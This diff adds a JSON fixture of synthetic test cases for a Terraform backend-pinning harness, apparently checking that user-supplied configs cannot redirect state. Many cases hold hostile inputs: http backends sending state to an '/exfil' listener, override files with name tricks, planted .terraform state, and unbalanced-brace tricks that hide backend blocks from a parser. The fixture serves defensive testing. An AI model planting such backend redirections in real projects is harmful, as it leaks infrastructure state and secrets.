@@ -1,0 +1,319 @@
+{
+ "_comment": "SYNTHETIC cases from the backend-pin proof harness (real Terraform 1.16.4, loopback only). __USER_LISTENER__ is replaced at run time by the test's loopback listener that stands in for the user's backend. r0-reviewer-exact is PR #287 comment 6436660507.",
+ "cases": {
+  "c1-cloud-block": {
+   "expect": "pinned",
+   "files": {
+    "main.tf": "terraform {\n  cloud {\n    hostname     = \"__USER_LISTENER__\"\n    organization = \"o\"\n    workspaces {\n      name = \"w\"\n    }\n  }\n}\n"
+   },
+   "harness": {
+    "exit": 0,
+    "refuse_override_name": [],
+    "refuse_state_artifact": [],
+    "saved_matches_ours": true,
+    "saved_type": "s3",
+    "user_contacts": 0
+   }
+  },
+  "c2-cloud-and-backend": {
+   "expect": "pinned",
+   "files": {
+    "cloud.tf": "terraform {\n  cloud {\n    hostname     = \"__USER_LISTENER__\"\n    organization = \"o\"\n    workspaces {\n      name = \"w\"\n    }\n  }\n}\n",
+    "main.tf": "terraform {\n  backend \"s3\" {\n    bucket       = \"alz-state-dev\"\n    key          = \"pilot/dev.tfstate\"\n    region       = \"us-east-1\"\n    use_lockfile = true\n  }\n}\n"
+   },
+   "harness": {
+    "exit": 1,
+    "refuse_override_name": [],
+    "refuse_state_artifact": [],
+    "saved_matches_ours": true,
+    "saved_type": "s3",
+    "user_contacts": 0
+   }
+  },
+  "c3-state-store": {
+   "expect": "pinned",
+   "files": {
+    "main.tf": "terraform {\n  state_store \"x\" {\n    provider \"p\" {}\n  }\n}\n"
+   },
+   "harness": {
+    "exit": 1,
+    "refuse_override_name": [],
+    "refuse_state_artifact": [],
+    "saved_matches_ours": true,
+    "saved_type": "s3",
+    "user_contacts": 0
+   }
+  },
+  "j1-dup-terraform-key": {
+   "expect": "pinned",
+   "files": {
+    "main.tf.json": "{\"terraform\":{\"backend\":{\"http\":{\"address\":\"http://__USER_LISTENER__/exfil\",\"username\":\"u\",\"password\":\"p\"}}},\"terraform\":{}}"
+   },
+   "harness": {
+    "exit": 0,
+    "refuse_override_name": [],
+    "refuse_state_artifact": [],
+    "saved_matches_ours": true,
+    "saved_type": "s3",
+    "user_contacts": 0
+   }
+  },
+  "m1-two-backends-two-files": {
+   "expect": "pinned",
+   "files": {
+    "a.tf": "terraform {\n  backend \"s3\" {\n    bucket       = \"alz-state-dev\"\n    key          = \"pilot/dev.tfstate\"\n    region       = \"us-east-1\"\n    use_lockfile = true\n  }\n}\n",
+    "b.tf": "terraform {\n  backend \"http\" {\n    address  = \"http://__USER_LISTENER__/exfil\"\n    username = \"u\"\n    password = \"p\"\n  }\n}\n"
+   },
+   "harness": {
+    "exit": 1,
+    "refuse_override_name": [],
+    "refuse_state_artifact": [],
+    "saved_matches_ours": true,
+    "saved_type": "s3",
+    "user_contacts": 0
+   }
+  },
+  "m2-two-backends-one-block": {
+   "expect": "pinned",
+   "files": {
+    "main.tf": "terraform {\n  backend \"s3\" {\n    bucket = \"alz-state-dev\"\n  }\n  backend \"http\" {\n    address = \"http://__USER_LISTENER__/exfil\"\n  }\n}\n"
+   },
+   "harness": {
+    "exit": 1,
+    "refuse_override_name": [],
+    "refuse_state_artifact": [],
+    "saved_matches_ours": true,
+    "saved_type": "s3",
+    "user_contacts": 0
+   }
+  },
+  "n-ok-s3": {
+   "expect": "pinned",
+   "files": {
+    "main.tf": "terraform {\n  backend \"s3\" {\n    bucket       = \"alz-state-dev\"\n    key          = \"pilot/dev.tfstate\"\n    region       = \"us-east-1\"\n    use_lockfile = true\n  }\n}\n"
+   },
+   "harness": {
+    "exit": 0,
+    "refuse_override_name": [],
+    "refuse_state_artifact": [],
+    "saved_matches_ours": true,
+    "saved_type": "s3",
+    "user_contacts": 0
+   }
+  },
+  "o1-backend-override-tf": {
+   "expect": "refused:BACKEND_OVERRIDE_NOT_ALLOWED",
+   "files": {
+    "backend_override.tf": "terraform {\n  backend \"http\" {\n    address  = \"http://__USER_LISTENER__/exfil\"\n    username = \"u\"\n    password = \"p\"\n  }\n}\n",
+    "main.tf": "terraform {\n  backend \"s3\" {\n    bucket       = \"alz-state-dev\"\n    key          = \"pilot/dev.tfstate\"\n    region       = \"us-east-1\"\n    use_lockfile = true\n  }\n}\n"
+   },
+   "harness": {
+    "exit": 0,
+    "refuse_override_name": [
+     "backend_override.tf"
+    ],
+    "refuse_state_artifact": [],
+    "saved_matches_ours": true,
+    "saved_type": "s3",
+    "user_contacts": 0
+   }
+  },
+  "o2-override-tf-json": {
+   "expect": "refused:BACKEND_OVERRIDE_NOT_ALLOWED",
+   "files": {
+    "main.tf": "terraform {\n  backend \"s3\" {\n    bucket       = \"alz-state-dev\"\n    key          = \"pilot/dev.tfstate\"\n    region       = \"us-east-1\"\n    use_lockfile = true\n  }\n}\n",
+    "main_override.tf.json": "{\"terraform\":{\"backend\":{\"http\":{\"address\":\"http://__USER_LISTENER__/exfil\"}}}}"
+   },
+   "harness": {
+    "exit": 0,
+    "refuse_override_name": [
+     "main_override.tf.json"
+    ],
+    "refuse_state_artifact": [],
+    "saved_matches_ours": true,
+    "saved_type": "s3",
+    "user_contacts": 0
+   }
+  },
+  "r0-reviewer-exact": {
+   "expect": "pinned",
+   "files": {
+    "main.tf": "locals {\n  a = (1 { )\n}\nterraform {\n  backend \"http\" {\n    address  = \"http://__USER_LISTENER__/exfil\"\n    username = \"u\"\n    password = \"p\"\n  }\n}\nx = (1 } )\n"
+   },
+   "harness": {
+    "exit": 1,
+    "refuse_override_name": [],
+    "refuse_state_artifact": [],
+    "saved_matches_ours": true,
+    "saved_type": "s3",
+    "user_contacts": 0
+   }
+  },
+  "r1-trailing-brace": {
+   "expect": "pinned",
+   "files": {
+    "main.tf": "locals {\n  a = (1 { )\n}\nterraform {\n  backend \"http\" {\n    address  = \"http://__USER_LISTENER__/exfil\"\n    username = \"u\"\n    password = \"p\"\n  }\n}\n}\n"
+   },
+   "harness": {
+    "exit": 1,
+    "refuse_override_name": [],
+    "refuse_state_artifact": [],
+    "saved_matches_ours": true,
+    "saved_type": "s3",
+    "user_contacts": 0
+   }
+  },
+  "r2-second-locals": {
+   "expect": "pinned",
+   "files": {
+    "main.tf": "locals {\n  a = (1 { )\n}\nterraform {\n  backend \"http\" {\n    address  = \"http://__USER_LISTENER__/exfil\"\n    username = \"u\"\n    password = \"p\"\n  }\n}\nlocals {\n  b = (1 } )\n}\n"
+   },
+   "harness": {
+    "exit": 1,
+    "refuse_override_name": [],
+    "refuse_state_artifact": [],
+    "saved_matches_ours": true,
+    "saved_type": "s3",
+    "user_contacts": 0
+   }
+  },
+  "r3-brackets": {
+   "expect": "pinned",
+   "files": {
+    "main.tf": "locals {\n  a = [1 { ]\n}\nterraform {\n  backend \"http\" {\n    address  = \"http://__USER_LISTENER__/exfil\"\n    username = \"u\"\n    password = \"p\"\n  }\n}\nx = (1 } )\n"
+   },
+   "harness": {
+    "exit": 1,
+    "refuse_override_name": [],
+    "refuse_state_artifact": [],
+    "saved_matches_ours": true,
+    "saved_type": "s3",
+    "user_contacts": 0
+   }
+  },
+  "r4-index": {
+   "expect": "pinned",
+   "files": {
+    "main.tf": "locals {\n  a = b[1 { ]\n}\nterraform {\n  backend \"http\" {\n    address  = \"http://__USER_LISTENER__/exfil\"\n    username = \"u\"\n    password = \"p\"\n  }\n}\nx = (1 } )\n"
+   },
+   "harness": {
+    "exit": 1,
+    "refuse_override_name": [],
+    "refuse_state_artifact": [],
+    "saved_matches_ours": true,
+    "saved_type": "s3",
+    "user_contacts": 0
+   }
+  },
+  "r5-function-call": {
+   "expect": "pinned",
+   "files": {
+    "main.tf": "locals {\n  a = f(1 { )\n}\nterraform {\n  backend \"http\" {\n    address  = \"http://__USER_LISTENER__/exfil\"\n    username = \"u\"\n    password = \"p\"\n  }\n}\nx = (1 } )\n"
+   },
+   "harness": {
+    "exit": 1,
+    "refuse_override_name": [],
+    "refuse_state_artifact": [],
+    "saved_matches_ours": true,
+    "saved_type": "s3",
+    "user_contacts": 0
+   }
+  },
+  "x01-saved-dotterraform-http": {
+   "expect": "refused:WORKSPACE_STATE_NOT_ALLOWED",
+   "files": {
+    ".terraform/terraform.tfstate": "{\"version\": 3, \"terraform_version\": \"1.16.4\", \"serial\": 1, \"lineage\": \"x\", \"backend\": {\"type\": \"http\", \"config\": {\"address\": \"http://__USER_LISTENER__/saved\", \"lock_address\": null, \"unlock_address\": null, \"update_method\": null, \"lock_method\": null, \"unlock_method\": null, \"username\": null, \"password\": null, \"skip_cert_verification\": null, \"retry_max\": null, \"retry_wait_min\": null, \"retry_wait_max\": null, \"client_certificate_pem\": null, \"client_private_key_pem\": null, \"client_ca_certificate_pem\": null}, \"hash\": 1}}",
+    "main.tf": "locals {\n  a = 1\n}\n"
+   },
+   "harness": {
+    "exit": 1,
+    "refuse_override_name": [],
+    "refuse_state_artifact": [
+     ".terraform"
+    ],
+    "saved_matches_ours": false,
+    "saved_type": "http",
+    "user_contacts": 0
+   }
+  },
+  "x02-local-tfstate-in-root": {
+   "expect": "refused:WORKSPACE_STATE_NOT_ALLOWED",
+   "files": {
+    "main.tf": "locals {\n  a = 1\n}\n",
+    "terraform.tfstate": "{\"version\": 4, \"terraform_version\": \"1.16.4\", \"serial\": 3, \"lineage\": \"11111111-2222-3333-4444-555555555555\", \"outputs\": {\"o\": {\"value\": \"user-data\", \"type\": \"string\"}}, \"resources\": []}"
+   },
+   "harness": {
+    "exit": 1,
+    "refuse_override_name": [],
+    "refuse_state_artifact": [
+     "terraform.tfstate"
+    ],
+    "saved_type": null,
+    "user_contacts": 0
+   }
+  },
+  "x03-dotterraform-environment": {
+   "expect": "refused:WORKSPACE_STATE_NOT_ALLOWED",
+   "files": {
+    ".terraform/environment": "evilws",
+    "main.tf": "locals {\n  a = 1\n}\n"
+   },
+   "harness": {
+    "exit": 0,
+    "refuse_override_name": [],
+    "refuse_state_artifact": [
+     ".terraform"
+    ],
+    "saved_matches_ours": true,
+    "saved_type": "s3",
+    "user_contacts": 0
+   }
+  },
+  "x05-hidden-state-store": {
+   "expect": "pinned",
+   "files": {
+    "main.tf": "locals {\n  a = (1 { )\n}\nterraform {\n  state_store \"http\" {\n    provider \"evil\" {}\n    address = \"http://__USER_LISTENER__/ss\"\n  }\n}\nx = (1 } )\n"
+   },
+   "harness": {
+    "exit": 1,
+    "refuse_override_name": [],
+    "refuse_state_artifact": [],
+    "saved_matches_ours": true,
+    "saved_type": "s3",
+    "user_contacts": 0
+   }
+  },
+  "x10-Override-uppercase": {
+   "expect": "refused:BACKEND_OVERRIDE_NOT_ALLOWED",
+   "files": {
+    "Override.tf": "terraform {\n  backend \"http\" {\n    address  = \"http://__USER_LISTENER__/exfil\"\n  }\n}\n"
+   },
+   "harness": {
+    "exit": 0,
+    "refuse_override_name": [
+     "Override.tf"
+    ],
+    "refuse_state_artifact": [],
+    "saved_matches_ours": true,
+    "saved_type": "s3",
+    "user_contacts": 0
+   }
+  },
+  "x13-bare-underscore-override": {
+   "expect": "refused:BACKEND_OVERRIDE_NOT_ALLOWED",
+   "files": {
+    "_override.tf": "terraform {\n  backend \"http\" {\n    address  = \"http://__USER_LISTENER__/exfil\"\n  }\n}\n"
+   },
+   "harness": {
+    "exit": 0,
+    "refuse_override_name": [
+     "_override.tf"
+    ],
+    "refuse_state_artifact": [],
+    "saved_matches_ours": true,
+    "saved_type": "s3",
+    "user_contacts": 0
+   }
+  }
+ }
+}
